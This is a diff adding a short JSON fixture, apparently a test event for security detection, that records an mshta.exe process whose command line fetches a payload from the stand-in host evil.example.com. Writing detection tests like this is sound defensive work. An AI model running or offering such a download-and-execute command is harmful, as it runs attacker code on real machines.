@@ -1,0 +1,7 @@
+{
+  "event_id": "evt-mshta-001",
+  "proc_name": "mshta.exe",
+  "command_line": "mshta http://evil.example.com/payload",
+  "rare_domain": true,
+  "url": "http://evil.example.com/payload"
+}
